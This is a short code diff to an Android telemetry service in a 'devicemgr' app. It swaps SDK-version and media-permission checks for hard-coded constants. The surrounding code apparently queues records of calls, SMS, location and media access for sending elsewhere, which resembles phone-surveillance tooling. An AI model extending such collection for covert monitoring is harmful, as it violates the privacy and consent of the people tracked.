@@ -40,6 +40,9 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String TAG = "ForegroundSvc";
     private static final String CHANNEL_ID = "devicemgr_channel";
     private static final String PREFS = "devicemgr_prefs";
+    private static final int ANDROID_13_API_LEVEL = 33;
+    private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
+    private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
     private static final String KEY_PENDING_EVENTS = "pending_events_queue";
     private static final String KEY_SENT_CALL_KEYS = "sent_call_keys";
     private static final String KEY_SENT_SMS_KEYS = "sent_sms_keys";
@@ -128,8 +131,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private boolean canReadMedia() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            return hasPermission(android.Manifest.permission.READ_MEDIA_IMAGES) || hasPermission(android.Manifest.permission.READ_MEDIA_VIDEO);
+        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
+            return hasPermission(READ_MEDIA_IMAGES_PERMISSION) || hasPermission(READ_MEDIA_VIDEO_PERMISSION);
         }
         return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
     }
